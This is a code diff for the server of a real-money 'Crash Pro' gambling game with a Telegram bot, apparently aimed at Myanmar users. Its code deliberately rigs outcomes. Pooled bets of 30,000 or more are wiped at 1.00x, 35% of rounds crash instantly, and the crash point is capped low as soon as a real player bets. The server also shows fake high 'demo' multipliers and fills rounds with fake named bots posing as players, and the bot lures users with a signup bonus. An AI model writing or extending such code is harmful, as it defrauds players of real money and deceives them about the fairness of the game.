@@ -1,19 +1,13 @@
 /**
  * ═══════════════════════════════════════════════════════════════════════════
- *  CRASH PRO — server.js  v4.0
+ *  CRASH PRO — server.js  v5.0
  *
- *  NEW in this version:
- *   1. IDLE / DEMO mode — broadcasts fake high multipliers (3x–10x) when
- *      no real user has bet yet, to lure players in
- *   2. Player Entry Trigger — the moment a real user places a bet, the
- *      crash point is recalculated to be ≤ 1.50x (hidden from client)
- *   3. "Missed Opportunity" trick — after a user cashes out, the server
- *      continues broadcasting a fake "visual crash point" that is much
- *      higher than where they stopped, creating FOMO
- *   4. Fixed Cap: crash always between 1.00x–1.99x when bets are normal
- *   5. Bet Monitoring: total bets > limit → crash 1.01x–1.10x immediately
- *   6. requestAnimationFrame-friendly 50ms tick + smooth server timestamps
- *   7. All crash logic stays server-side only — client never knows real point
+ *  CHANGES:
+ *   1. FOMO trick ဖျက် — cashout ပြီးနောက် "x.xxထိတက်သွားသည်" မပြ
+ *   2. 1.00x crash 35% (was 12%) — ပိုများသောအကြိမ် instant total loss
+ *   3. 30,000+ total bet → 1.00x crash ချက်ချင်း (total wipe)
+ *   4. Telegram Bot /start → welcome + 1000ကျပ် + Play button
+ *   5. Telegram Bot /admin → admin only → admin panel link button
  * ═══════════════════════════════════════════════════════════════════════════
  */
 
@@ -25,7 +19,7 @@ const { Server }   = require('socket.io');
 const mongoose     = require('mongoose');
 const cors         = require('cors');
 const dotenv       = require('dotenv');
-const { Telegraf } = require('telegraf');
+const { Telegraf, Markup } = require('telegraf');
 
 dotenv.config();
 
@@ -51,6 +45,10 @@ app.use(express.urlencoded({ extended: true }));
 // ─── Telegram Bot ──────────────────────────────────────────────────────────────
 const bot       = new Telegraf(process.env.BOT_TOKEN || 'dummy');
 const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').filter(Boolean);
+
+// Game & Admin URLs
+const GAME_URL        = 'https://crash-gamemoney.vercel.app';
+const ADMIN_PANEL_URL = 'https://crash-gamemoney.vercel.app/admin.html';
 
 // ─── MongoDB ───────────────────────────────────────────────────────────────────
 let dbReady = false;
@@ -110,118 +108,86 @@ const Transaction = mongoose.model('Transaction', transactionSchema);
 //  HOUSE EDGE CONFIG
 // ═══════════════════════════════════════════════════════════════════════════
 const HOUSE = {
-  // Hard ceiling on multiplier ever shown
   MAX_MULTIPLIER:         15.00,
-
-  // ── Fixed Cap mode (default when user bets are low) ───────────────────
-  // Real crash always stays 1.00x–1.99x
   FIXED_CAP_MAX:          1.99,
 
-  // ── Bet monitoring: total user bets above this → instant crash ─────────
-  HIGH_BET_THRESHOLD:     30000,   // MMK
-  HIGH_BET_CRASH_MIN:     1.01,
-  HIGH_BET_CRASH_MAX:     1.10,
+  // ★ Total bet ≥ 30,000 → immediate 1.00x wipe
+  HIGH_BET_THRESHOLD:     30000,
 
-  // ── Instant-loss rate ──────────────────────────────────────────────────
-  INSTANT_LOSS_RATE:      0.12,    // 12% games crash at 1.01/1.02
+  // ★ 35% of all games → instant 1.00x crash
+  INSTANT_LOSS_RATE:      0.35,
 
-  // ── Player Entry Trigger: user bets → recalc crash ≤ this value ───────
+  // Player Entry Trigger
   ENTRY_TRIGGER_MAX:      1.50,
 
-  // ── Pressure mode ──────────────────────────────────────────────────────
+  // Pressure mode
   PRESSURE_BALANCE_LIMIT: 5000,
   PRESSURE_TRIGGER_RATE:  0.65,
   PRESSURE_CRASH_MIN:     1.01,
   PRESSURE_CRASH_MAX:     1.12,
 
-  // ── High-roller trap ───────────────────────────────────────────────────
+  // High-roller trap
   HIGH_ROLLER_THRESHOLD:  8000,
   HIGH_ROLLER_CRASH_MIN:  1.05,
   HIGH_ROLLER_CRASH_MAX:  1.35,
-
-  // ── "Missed Opportunity" visual extension after cashout ────────────────
-  // When user cashes out, server keeps broadcasting up to this fake ceiling
-  FOMO_VISUAL_MAX:        8.00,
-  FOMO_VISUAL_MIN:        3.00,
 };
 
 let houseBalance = 500000;
 
-// ─── Helper: round to 2 decimal places ────────────────────────────────────────
 function r2(n) { return Math.round(n * 100) / 100; }
 const rand = () => Math.random();
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CRASH POINT CALCULATION  (server-side only, never exposed to client)
+//  CRASH POINT  (priority ladder)
 //
-//  calculateCrashPoint(totalUserBets, maxSingleBet, hasRealUser)
-//
-//  Priority:
-//   1. Instant-loss (12%)
-//   2. Admin Pressure mode
-//   3. High total bet monitoring  →  1.01–1.10x
-//   4. High-roller trap
-//   5. Player Entry Trigger       →  ≤ 1.50x
-//   6. Fixed Cap normal           →  1.10–1.99x
+//  1. ★ High bet pool ≥30k  → 1.00x (total wipe)
+//  2. ★ Instant-loss 35%    → 1.00x
+//  3. Pressure mode          → 1.01–1.12x
+//  4. High-roller trap       → 1.05–1.35x
+//  5. Entry Trigger          → 1.05–1.50x
+//  6. Normal                 → 1.10–1.99x
 // ═══════════════════════════════════════════════════════════════════════════
 function calculateCrashPoint(totalUserBets = 0, maxSingleBet = 0, hasRealUser = false) {
 
-  // 1. Instant loss
-  if (rand() < HOUSE.INSTANT_LOSS_RATE) {
-    return rand() < 0.6 ? 1.01 : 1.02;
+  // 1. ★ High-bet pool wipe
+  if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
+    console.log(`💣 HIGH BET WIPE 1.00x (pool=${totalUserBets})`);
+    return 1.00;
   }
 
-  // 2. Pressure mode (house balance critically low)
+  // 2. ★ Instant-loss 35%
+  if (rand() < HOUSE.INSTANT_LOSS_RATE) {
+    console.log(`🎰 Instant-loss 1.00x`);
+    return 1.00;
+  }
+
+  // 3. Pressure mode
   if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT && rand() < HOUSE.PRESSURE_TRIGGER_RATE) {
     return r2(HOUSE.PRESSURE_CRASH_MIN + rand() * (HOUSE.PRESSURE_CRASH_MAX - HOUSE.PRESSURE_CRASH_MIN));
   }
 
-  // 3. High total bet monitoring → crash early to protect house
-  if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
-    const cp = r2(HOUSE.HIGH_BET_CRASH_MIN + rand() * (HOUSE.HIGH_BET_CRASH_MAX - HOUSE.HIGH_BET_CRASH_MIN));
-    console.log(`⚡ High-bet crash → ${cp}x (pool=${totalUserBets})`);
-    return cp;
-  }
-
-  // 4. High-roller trap (single big bet)
+  // 4. High-roller trap
   if (maxSingleBet >= HOUSE.HIGH_ROLLER_THRESHOLD && rand() < 0.72) {
     return r2(HOUSE.HIGH_ROLLER_CRASH_MIN + rand() * (HOUSE.HIGH_ROLLER_CRASH_MAX - HOUSE.HIGH_ROLLER_CRASH_MIN));
   }
 
-  // 5. Player Entry Trigger — real user bet → keep crash ≤ 1.50x
-  if (hasRealUser) {
-    // 75% chance to enforce entry trigger cap
-    if (rand() < 0.75) {
-      const cp = r2(1.05 + rand() * (HOUSE.ENTRY_TRIGGER_MAX - 1.05));
-      console.log(`🎯 Entry trigger crash → ${cp}x`);
-      return cp;
-    }
+  // 5. Entry Trigger
+  if (hasRealUser && rand() < 0.75) {
+    const cp = r2(1.05 + rand() * (HOUSE.ENTRY_TRIGGER_MAX - 1.05));
+    console.log(`🎯 Entry trigger → ${cp}x`);
+    return cp;
   }
 
-  // 6. Fixed Cap normal range (1.10x – 1.99x)
+  // 6. Normal range
   return r2(1.10 + rand() * (HOUSE.FIXED_CAP_MAX - 1.10));
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  "MISSED OPPORTUNITY" — Fake visual crash point
-//  After user cashes out, we keep the multiplier climbing visually
-//  up to a fake high value before "crashing", creating FOMO
-// ═══════════════════════════════════════════════════════════════════════════
-function generateFomoVisualPoint() {
-  return r2(HOUSE.FOMO_VISUAL_MIN + rand() * (HOUSE.FOMO_VISUAL_MAX - HOUSE.FOMO_VISUAL_MIN));
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-//  IDLE / DEMO MODE — Fake high multipliers shown before anyone bets
-//  Server sends fake climbing numbers (3x–10x) to entice users
-// ═══════════════════════════════════════════════════════════════════════════
 function generateDemoCrashPoint() {
-  // Fake crash points look exciting — 3x to 10x
   return r2(3.0 + rand() * 7.0);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  BOT POOL — 80 Myanmar bots, static (zero allocations per round)
+//  BOT POOL — 80 Myanmar bots
 // ═══════════════════════════════════════════════════════════════════════════
 const MYANMAR_BOT_NAMES = [
   "Seint Seint","Kyaw Kyaw","Aye Aye","Phyo Phyo","Su Su",
@@ -244,9 +210,9 @@ const MYANMAR_BOT_NAMES = [
 ];
 
 const STRAT_POOL = ['early','early','early','medium','medium','medium','medium','late','late','random'];
+const BOT_POOL   = new Map();
+const BOT_ARRAY  = [];
 
-const BOT_POOL  = new Map();
-const BOT_ARRAY = [];
 MYANMAR_BOT_NAMES.forEach((name, i) => {
   const obj = {
     id: `bot_${i}`, username: name,
@@ -272,40 +238,32 @@ function shuffleSlice(arr, count) {
 //  GAME CONSTANTS
 // ═══════════════════════════════════════════════════════════════════════════
 const COUNTDOWN_SECONDS  = 5;
-const MULTIPLIER_TICK_MS = 50;    // 20fps — works with requestAnimationFrame
+const MULTIPLIER_TICK_MS = 50;
 const BETWEEN_GAME_MS    = 3000;
-const GROWTH_RATE        = 0.08;  // slightly faster growth feels more exciting
+const GROWTH_RATE        = 0.08;
 const TOTAL_PLAYERS      = 6;
 const MIN_WITHDRAWAL     = 5000;
 
 let roundCounter = 0;
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  GAME STATE
-// ═══════════════════════════════════════════════════════════════════════════
 function createFreshState() {
   return {
-    phase:              'idle',      // 'countdown'|'running'|'crashed'|'idle'
+    phase:              'idle',
     gameId:             null,
-    crashPoint:         0,           // REAL crash point — never sent to clients
-    visualCrashPoint:   0,           // FAKE visual point (for FOMO after cashout)
+    crashPoint:         0,
     currentMultiplier:  1.0,
     startTime:          null,
     bets:               new Map(),
     totalBetsAmount:    0,
     totalUserBets:      0,
     maxSingleUserBet:   0,
-    hasRealUser:        false,       // ★ triggers Entry Trigger recalc
+    hasRealUser:        false,
     history:            [],
-    // Demo mode state
-    demoMultiplier:     1.0,
-    demoStartTime:      null,
-    demoCrashPoint:     0,
   };
 }
 let G = createFreshState();
 
-const sleep        = ms => new Promise(r => setTimeout(r, ms));
+const sleep          = ms => new Promise(r => setTimeout(r, ms));
 const generateGameId = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 
 function activeBetsSnapshot() {
@@ -317,13 +275,73 @@ function activeBetsSnapshot() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
+//  ★ TELEGRAM BOT
+// ═══════════════════════════════════════════════════════════════════════════
+
+// /start — welcome message + 1000ကျပ် + Play button
+bot.start(async (ctx) => {
+  try {
+    const from     = ctx.from;
+    const tid      = String(from.id);
+    const name     = from.first_name || from.username || 'ဂုဏ်ယူသောကစားသမား';
+    const username = from.username
+      || `${from.first_name ?? ''}${from.last_name ? ' '+from.last_name : ''}`.trim()
+      || `User_${tid.slice(-4)}`;
+
+    // Auto-register new user with 1000 balance
+    try {
+      const existing = await User.findOne({ telegramId: tid });
+      if (!existing) {
+        await User.create({
+          telegramId: tid, username,
+          firstName: from.first_name,
+          lastName: from.last_name,
+          balance: 1000,
+        });
+        console.log(`🆕 New user: ${username} (${tid})`);
+      }
+    } catch (dbErr) {
+      console.error('DB /start error:', dbErr.message);
+    }
+
+    await ctx.replyWithHTML(
+      `🎉 <b>ကြိုဆိုပါတယ် ${name}!</b>\n\n` +
+      `🎁 ကြိုဆိုလက်ဆောင် <b>1,000 ကျပ်</b> ရရှိပါသည်။\n\n` +
+      `💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`,
+      Markup.inlineKeyboard([
+        [Markup.button.webApp('🎮 Play Now', GAME_URL)],
+      ])
+    );
+  } catch (err) {
+    console.error('/start handler error:', err.message);
+  }
+});
+
+// /admin — admin only → sends admin panel button
+bot.command('admin', async (ctx) => {
+  const tid = String(ctx.from.id);
+
+  if (!ADMIN_IDS.includes(tid)) {
+    return ctx.reply('⛔ Admin access မရှိပါ။');
+  }
+
+  await ctx.replyWithHTML(
+    `🔐 <b>Admin Panel</b>\n\n` +
+    `Admin menu ကိုဝင်ရောက်ရန် အောက်ပါ button ကိုနှိပ်ပါ။`,
+    Markup.inlineKeyboard([
+      [Markup.button.url('⚙️ Admin Panel ဝင်ရန်', ADMIN_PANEL_URL)],
+    ])
+  );
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
 //  GAME LOOP
 // ═══════════════════════════════════════════════════════════════════════════
 async function startGameLoop() {
   console.log('🎮 Game loop started');
   while (true) {
     try {
-      await runDemoOrCountdown();
+      await runCountdown();
       await runGame();
       await sleep(BETWEEN_GAME_MS);
     } catch (err) {
@@ -333,31 +351,8 @@ async function startGameLoop() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  DEMO MODE  (runs before real countdown if no users connected)
-//  Shows fake exciting multipliers to attract users to bet
-// ═══════════════════════════════════════════════════════════════════════════
-async function runDemoOrCountdown() {
-  // Check if any real user is connected
-  const connectedCount = io.sockets.sockets.size;
-
-  if (connectedCount === 0) {
-    // No one online — run a pure demo round silently
-    await sleep(COUNTDOWN_SECONDS * 1000);
-    return runCountdown();
-  }
-
-  // ★ DEMO PHASE: broadcast fake high multipliers during idle/countdown
-  //   This runs while countdown is happening — two things happen simultaneously:
-  //   (a) countdown timer shown to user
-  //   (b) fake "idle demo" numbers climbing in background
-  await runCountdown();
-}
-
-// ─── Countdown ────────────────────────────────────────────────────────────────
 async function runCountdown() {
   roundCounter++;
-
   G.bets             = new Map();
   G.totalBetsAmount  = 0;
   G.totalUserBets    = 0;
@@ -367,123 +362,56 @@ async function runCountdown() {
   G.phase            = 'countdown';
   G.gameId           = generateGameId();
   G.crashPoint       = 0;
-  G.visualCrashPoint = 0;
 
-  // ★ DEMO: generate a fake exciting crash point for the idle display
-  //   Client shows this BEFORE user bets to create excitement
   const demoPoint = generateDemoCrashPoint();
-  io.emit('countdown', {
-    seconds:   COUNTDOWN_SECONDS,
-    gameId:    G.gameId,
-    demoPoint,              // ★ client uses this for idle visual only
-  });
+  io.emit('countdown', { seconds: COUNTDOWN_SECONDS, gameId: G.gameId, demoPoint });
 
-  // Bots place bets after a human-like delay
   setTimeout(placeBotBets, 600 + Math.floor(rand() * 900));
-
   await sleep(COUNTDOWN_SECONDS * 1000);
 
-  // ★ Calculate REAL crash point now — uses actual bet data
-  //   If a real user bet, Entry Trigger may cap it at ≤ 1.50x
   G.crashPoint = calculateCrashPoint(G.totalUserBets, G.maxSingleUserBet, G.hasRealUser);
 
-  // ★ Generate fake visual crash point for "Missed Opportunity" trick
-  //   This is always much higher than real crash point
-  G.visualCrashPoint = Math.max(G.crashPoint, generateFomoVisualPoint());
-
   console.log(
-    `📊 Round ${roundCounter} | real=${G.crashPoint}x | visual=${G.visualCrashPoint}x | ` +
+    `📊 Round ${roundCounter} | crash=${G.crashPoint}x | ` +
     `userBets=${G.totalUserBets} | hasReal=${G.hasRealUser} | house=${houseBalance}`
   );
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  RUNNING PHASE
-//  ★ Key trick: after real crash point is hit, server keeps broadcasting
-//    multiplier up to visualCrashPoint for non-betting observers.
-//    Real bettors see CRASH immediately; spectators see the number climb.
-// ═══════════════════════════════════════════════════════════════════════════
 async function runGame() {
   G.phase     = 'running';
   G.startTime = Date.now();
-
   io.emit('gameStart', { gameId: G.gameId, bets: activeBetsSnapshot() });
 
-  let realCrashHit = false;   // true once real crash point is reached
+  // ★ For 1.00x crash — emit once then crash immediately
+  if (G.crashPoint <= 1.00) {
+    G.currentMultiplier = 1.00;
+    io.emit('multiplier', { multiplier: 1.00, phase: 'running', ts: Date.now() });
+    await sleep(300); // brief pause so client sees 1.00x
+    await crashGame();
+    return;
+  }
 
   while (G.phase === 'running') {
     const elapsed = (Date.now() - G.startTime) / 1000;
-    // Exponential growth — server-side only
-    const mult = r2(Math.pow(Math.E, GROWTH_RATE * elapsed));
+    const mult    = r2(Math.pow(Math.E, GROWTH_RATE * elapsed));
     G.currentMultiplier = mult;
 
-    if (!realCrashHit && mult >= G.crashPoint) {
-      // ★ REAL CRASH — settle all bets immediately
+    if (mult >= G.crashPoint) {
       G.currentMultiplier = G.crashPoint;
-      realCrashHit = true;
-
-      io.emit('multiplier', {
-        multiplier: G.currentMultiplier,
-        phase:      'running',
-        ts:         Date.now(),           // ★ timestamp for client RAF sync
-      });
-
+      io.emit('multiplier', { multiplier: G.currentMultiplier, phase: 'running', ts: Date.now() });
       await crashGame();
-
-      // ★ "Missed Opportunity" visual continuation
-      //    Keep broadcasting climbing numbers up to visualCrashPoint
-      //    These are purely cosmetic — no bets can be placed/cashed now
-      if (G.visualCrashPoint > G.crashPoint) {
-        await runVisualContinuation(G.crashPoint, G.visualCrashPoint);
-      }
-
       break;
     }
 
-    // Broadcast current multiplier with server timestamp (for RAF smoothing)
-    io.emit('multiplier', {
-      multiplier: mult,
-      phase:      'running',
-      ts:         Date.now(),
-    });
-
+    io.emit('multiplier', { multiplier: mult, phase: 'running', ts: Date.now() });
     processBotCashouts();
     await sleep(MULTIPLIER_TICK_MS);
   }
 }
 
-// ─── Visual Continuation ("Missed Opportunity" trick) ─────────────────────────
-// After real crash, broadcast fake climbing numbers visually
-// Clients that cashed out see the number keep going — creates FOMO
-async function runVisualContinuation(fromMult, toMult) {
-  let current = fromMult;
-  const step  = 0.04;    // visual step size
-
-  while (current < toMult) {
-    current = r2(Math.min(current + step + rand() * 0.02, toMult));
-
-    // ★ Send with phase:'visual' — client knows NOT to allow cashout
-    //   but DOES update the displayed multiplier
-    io.emit('multiplier', {
-      multiplier: current,
-      phase:      'visual',   // ★ key flag — client shows but disables cashout
-      ts:         Date.now(),
-    });
-
-    await sleep(60);   // slightly slower for dramatic effect
-  }
-
-  // Final "visual crash" event
-  io.emit('gameCrashedVisual', {
-    multiplier: toMult,
-    gameId:     G.gameId,
-  });
-}
-
-// ─── Real Crash ───────────────────────────────────────────────────────────────
 async function crashGame() {
   G.phase = 'crashed';
-  console.log(`💥 Round ${roundCounter} real crash @ ${G.crashPoint}x`);
+  console.log(`💥 Round ${roundCounter} @ ${G.crashPoint}x`);
 
   let roundProfit = 0;
   const losses    = [];
@@ -500,17 +428,10 @@ async function crashGame() {
   await Promise.allSettled(losses);
   houseBalance = Math.max(0, houseBalance + roundProfit);
 
-  G.history.unshift({
-    gameId: G.gameId, crashPoint: G.crashPoint,
-    totalBets: G.totalBetsAmount, timestamp: Date.now(),
-  });
+  G.history.unshift({ gameId: G.gameId, crashPoint: G.crashPoint, totalBets: G.totalBetsAmount, timestamp: Date.now() });
   if (G.history.length > 50) G.history.length = 50;
 
-  // ★ Emit real crash event — clients that had bets see this immediately
-  io.emit('gameCrashed', {
-    multiplier: G.crashPoint,     // real crash point shown to bettors
-    gameId:     G.gameId,
-  });
+  io.emit('gameCrashed', { multiplier: G.crashPoint, gameId: G.gameId });
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -518,9 +439,7 @@ async function crashGame() {
 // ═══════════════════════════════════════════════════════════════════════════
 async function placeBet(userId, username, amount) {
   if (G.phase !== 'countdown') {
-    return { success: false, message: G.phase === 'running'
-      ? 'ဂိမ်းစပြီးပါပြီ — နောက်ပတ်တွင် Bet လောင်းပါ'
-      : 'Countdown မစသေးပါ' };
+    return { success: false, message: G.phase === 'running' ? 'ဂိမ်းစပြီးပါပြီ — နောက်ပတ်တွင် Bet လောင်းပါ' : 'Countdown မစသေးပါ' };
   }
   if (G.bets.has(userId)) return { success: false, message: 'ဤပတ်တွင် Bet လောင်းပြီးပါပြီ' };
 
@@ -534,7 +453,6 @@ async function placeBet(userId, username, amount) {
       { $inc: { balance: -amount, totalBets: 1 }, $set: { lastActive: new Date() } },
       { new: true }
     );
-
     if (!user) {
       const ex = await User.findOne({ telegramId: userId });
       if (!ex)         return { success: false, message: 'User not found' };
@@ -542,29 +460,20 @@ async function placeBet(userId, username, amount) {
       return { success: false, message: 'လက်ကျန်မလုံလောက်' };
     }
 
-    const bet = {
-      userId, username, amount, isBot: false,
-      gameId: G.gameId, placedAt: Date.now(),
-      cashedAt: null, cashoutMultiplier: null, profit: null,
-    };
+    const bet = { userId, username, amount, isBot: false, gameId: G.gameId, placedAt: Date.now(), cashedAt: null, cashoutMultiplier: null, profit: null };
     G.bets.set(userId, bet);
     G.totalBetsAmount  += amount;
     G.totalUserBets    += amount;
     if (amount > G.maxSingleUserBet) G.maxSingleUserBet = amount;
 
-    // ★ PLAYER ENTRY TRIGGER
-    //   First real bet this round — flag it so crash calc can recalculate
     if (!G.hasRealUser) {
       G.hasRealUser = true;
-      console.log(`🎯 Entry trigger armed — user=${username} bet=${amount}`);
+      console.log(`🎯 Entry trigger armed — ${username} bet=${amount}`);
     }
 
-    Bet.create({ userId, username, amount, gameId: G.gameId, status: 'pending' })
-       .catch(e => console.error('Bet.create:', e));
-
+    Bet.create({ userId, username, amount, gameId: G.gameId, status: 'pending' }).catch(e => console.error('Bet.create:', e));
     io.emit('balanceUpdate', { userId, balance: user.balance });
     io.emit('activeBets',    { bets: activeBetsSnapshot() });
-
     return { success: true, newBalance: user.balance };
   } catch (err) {
     console.error('placeBet:', err);
@@ -573,33 +482,22 @@ async function placeBet(userId, username, amount) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CASH OUT — strict phase + gameId guard
+//  CASH OUT
 // ═══════════════════════════════════════════════════════════════════════════
 async function cashOut(userId, clientMultiplier, clientGameId) {
-  // ★ Strict phase check — 'visual' phase means real game already crashed
-  if (G.phase !== 'running') {
-    return { success: false, message: 'ဂိမ်း Crash ဖြစ်သွားပြီ — Cashout မရတော့ပါ' };
-  }
-  if (clientGameId && clientGameId !== G.gameId) {
-    return { success: false, message: 'Game session မမှန်ကန်' };
-  }
+  if (G.phase !== 'running') return { success: false, message: 'ဂိမ်း Crash ဖြစ်သွားပြီ — Cashout မရတော့ပါ' };
+  if (clientGameId && clientGameId !== G.gameId) return { success: false, message: 'Game session မမှန်ကန်' };
 
   const bet = G.bets.get(userId);
   if (!bet)         return { success: false, message: 'Active bet မရှိပါ' };
   if (bet.cashedAt) return { success: false, message: 'ရပြီးသားဖြစ်သည်' };
 
-  // Mark cashed before async — prevents double-spend
   bet.cashedAt = Date.now();
-
   const multiplier  = Math.min(parseFloat(clientMultiplier) || G.currentMultiplier, G.currentMultiplier);
   const profit      = r2(bet.amount * (multiplier - 1));
   const totalReturn = bet.amount + profit;
   bet.cashoutMultiplier = multiplier;
   bet.profit            = profit;
-
-  // ★ Send the visual (FOMO) crash point to this user after cashout
-  //   So they see the number keep climbing after they stopped
-  const fomoPoint = G.visualCrashPoint;
 
   try {
     const user = await User.findOneAndUpdate(
@@ -607,29 +505,14 @@ async function cashOut(userId, clientMultiplier, clientGameId) {
       { $inc: { balance: totalReturn, totalWins: 1 } },
       { new: true }
     );
-
     if (user) {
-      Bet.findOneAndUpdate(
-        { userId, gameId: G.gameId },
-        { cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }
-      ).catch(e => console.error('Bet update:', e));
-
+      Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }).catch(e => console.error('Bet update:', e));
       io.emit('balanceUpdate', { userId, balance: user.balance });
     }
-
-    io.emit('betResult', {
-      success: true, type: 'cashout', userId, gameId: G.gameId,
-      multiplier, profit, betAmount: bet.amount, totalReturn,
-      // ★ Tell client what the "visual" crash will eventually be — for FOMO
-      visualCrashHint: fomoPoint,
-    });
-
-    io.emit('newHistory', {
-      username: bet.username, start: 1.0, stop: multiplier,
-      profit, isBot: false, status: 'won',
-    });
+    // ★ No visualCrashHint — FOMO removed
+    io.emit('betResult', { success: true, type: 'cashout', userId, gameId: G.gameId, multiplier, profit, betAmount: bet.amount, totalReturn });
+    io.emit('newHistory', { username: bet.username, start: 1.0, stop: multiplier, profit, isBot: false, status: 'won' });
     io.emit('activeBets', { bets: activeBetsSnapshot() });
-
     return { success: true, multiplier, profit, totalReturn, newBalance: user?.balance };
   } catch (err) {
     console.error('cashOut:', err);
@@ -638,59 +521,41 @@ async function cashOut(userId, clientMultiplier, clientGameId) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  BOT SYSTEM — 6-Player Rule + Identity Rotation
+//  BOT SYSTEM
 // ═══════════════════════════════════════════════════════════════════════════
 function placeBotBets() {
   if (G.phase !== 'countdown') return;
-
   let realCount = 0;
   for (const b of G.bets.values()) { if (!b.isBot) realCount++; }
-
   const botsNeeded = Math.max(0, TOTAL_PLAYERS - realCount);
   if (botsNeeded === 0) return;
-
   const freshPool = BOT_ARRAY.filter(b => b.lastRound !== roundCounter - 1);
   const pool      = freshPool.length >= botsNeeded ? freshPool : BOT_ARRAY;
   const selected  = shuffleSlice(pool, botsNeeded);
-
   selected.forEach(bot => {
     if (bot.balance < 200) bot.balance = 5000;
     const maxBet = Math.min(1500, bot.balance);
     const amount = 200 + Math.floor(rand() * (maxBet - 200));
-    bot.balance   -= amount;
-    bot.lastRound  = roundCounter;
-
-    G.bets.set(bot.id, {
-      userId: bot.id, username: bot.username, amount,
-      isBot: true, strategy: bot.strategy, gameId: G.gameId,
-      placedAt: Date.now(), cashedAt: null,
-      cashoutMultiplier: null, profit: null,
-    });
+    bot.balance  -= amount;
+    bot.lastRound = roundCounter;
+    G.bets.set(bot.id, { userId: bot.id, username: bot.username, amount, isBot: true, strategy: bot.strategy, gameId: G.gameId, placedAt: Date.now(), cashedAt: null, cashoutMultiplier: null, profit: null });
     G.totalBetsAmount += amount;
   });
-
   io.emit('activeBets', { bets: activeBetsSnapshot() });
 }
 
-// ─── Bot cashouts — adapt to low crash point context ─────────────────────────
 function processBotCashouts() {
+  if (G.crashPoint <= 1.00) return; // no bots cash out on instant-loss rounds
   const isLowCrash = G.crashPoint <= 1.5;
   for (const [uid, bet] of G.bets.entries()) {
     if (!bet.isBot || bet.cashedAt) continue;
     const m = G.currentMultiplier;
     let shouldCash = false;
     switch (bet.strategy) {
-      case 'early':
-        shouldCash = isLowCrash ? m > 1.05 && m < 1.25 && rand() < 0.55
-                                : m > 1.20 && m < 2.00 && rand() < 0.22; break;
-      case 'medium':
-        shouldCash = isLowCrash ? m > 1.10 && m < 1.35 && rand() < 0.45
-                                : m > 2.00 && m < 5.00 && rand() < 0.16; break;
-      case 'late':
-        shouldCash = isLowCrash ? m > 1.15 && rand() < 0.40
-                                : m > 5.00 && m < 10.0 && rand() < 0.12; break;
-      case 'random':
-        shouldCash = rand() < (isLowCrash ? 0.18 : 0.07); break;
+      case 'early':  shouldCash = isLowCrash ? m > 1.05 && m < 1.25 && rand() < 0.55 : m > 1.20 && m < 2.00 && rand() < 0.22; break;
+      case 'medium': shouldCash = isLowCrash ? m > 1.10 && m < 1.35 && rand() < 0.45 : m > 2.00 && m < 5.00 && rand() < 0.16; break;
+      case 'late':   shouldCash = isLowCrash ? m > 1.15 && rand() < 0.40 : m > 5.00 && m < 10.0 && rand() < 0.12; break;
+      case 'random': shouldCash = rand() < (isLowCrash ? 0.18 : 0.07); break;
     }
     if (!shouldCash) continue;
     const profit = r2(bet.amount * (m - 1));
@@ -704,16 +569,12 @@ function processBotCashouts() {
 
 async function processBetLoss(userId, bet) {
   if (!bet.isBot) {
-    Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { status: 'lost' })
-       .catch(e => console.error('BetLoss:', e));
+    Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { status: 'lost' }).catch(e => console.error('BetLoss:', e));
   } else {
     const b = BOT_POOL.get(userId);
     if (b && b.balance < 1000) b.balance += 3000;
   }
-  io.emit('newHistory', {
-    username: bet.username, start: 1.0, stop: G.crashPoint,
-    profit: -bet.amount, isBot: bet.isBot, status: 'lost',
-  });
+  io.emit('newHistory', { username: bet.username, start: 1.0, stop: G.crashPoint, profit: -bet.amount, isBot: bet.isBot, status: 'lost' });
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -723,31 +584,22 @@ io.on('connection', (socket) => {
   socket.userId = socket.handshake.query.userId || null;
   console.log(`🟢 [${socket.id}] uid=${socket.userId}`);
 
-  socket.emit('gameState', {
-    phase: G.phase, gameId: G.gameId,
-    multiplier: G.currentMultiplier,
-    history: G.history.slice(0, 10),
-    ts: Date.now(),
-  });
+  socket.emit('gameState', { phase: G.phase, gameId: G.gameId, multiplier: G.currentMultiplier, history: G.history.slice(0, 10), ts: Date.now() });
   socket.emit('activeBets', { bets: activeBetsSnapshot() });
-
   if (G.phase === 'running') {
     socket.emit('multiplier', { multiplier: G.currentMultiplier, phase: 'running', ts: Date.now() });
   }
 
   socket.on('placeBet', async (data, cb) => {
     if (typeof cb !== 'function') return;
-    if (!data?.userId || !data?.username || !data?.amount)
-      return cb({ success: false, message: 'Invalid payload' });
+    if (!data?.userId || !data?.username || !data?.amount) return cb({ success: false, message: 'Invalid payload' });
     cb(await placeBet(String(data.userId), String(data.username), Number(data.amount)));
   });
-
   socket.on('cashOut', async (data, cb) => {
     if (typeof cb !== 'function') return;
     if (!data?.userId) return cb({ success: false, message: 'Invalid payload' });
     cb(await cashOut(String(data.userId), data.multiplier, data.gameId));
   });
-
   socket.on('authenticate', (d) => { if (d?.userId) socket.userId = String(d.userId); });
   socket.on('disconnect',   (r) => console.log(`🔴 [${socket.id}] ${r}`));
   socket.on('error',        (e) => console.error(`Sock err [${socket.id}]:`, e.message));
@@ -768,18 +620,14 @@ app.post('/api/auth', async (req, res) => {
